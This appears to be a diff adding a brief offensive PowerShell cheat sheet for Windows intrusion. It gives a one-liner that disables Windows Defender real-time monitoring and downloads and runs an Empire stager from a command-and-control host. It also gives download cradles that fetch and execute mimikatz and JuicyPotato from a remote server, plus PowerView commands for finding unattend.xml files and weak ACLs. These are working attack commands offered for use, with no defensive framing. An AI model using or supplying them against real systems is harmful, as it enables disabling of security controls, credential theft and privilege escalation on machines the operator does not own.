@@ -1,0 +1,25 @@
+RANDOM POWERSHELL
+This works for disabling Windows Defender and running empire stager: 
+
+powershell -exec bypass Set-MpPreference -DisableRealtimeMonitoring $true && cmd  /c "powershell -noninteractive -command IEX (New-Object Net.WebClient).DownloadString('http://cloud.c2server.net:81/file2.ps1')"
+
+Download Cradle
+
+(new-object System.Net.Webclient).DownloadString('http://192.168.50.34:8080/mimikatz.exe')
+
+Download Cradle and Execute
+
+(new-object System.Net.Webclient).DownloadString('http://192.168.50.34:8080/mimikatz.ps1') | IEX
+
+Download EXE and place it
+
+IEX (new-object System.Net.Webclient).DownloadFile('http://192.168.50.34:8080/JuicyPotato.exe','C:\users\public\downloads\potato.exe')
+
+PowerView - Find interesting files e.g., unattend.xml
+
+Find-InterestingFile -Path 'C:\' -Include 'unattend*.xml' 
+
+Find-InterestingACL
+
+
+
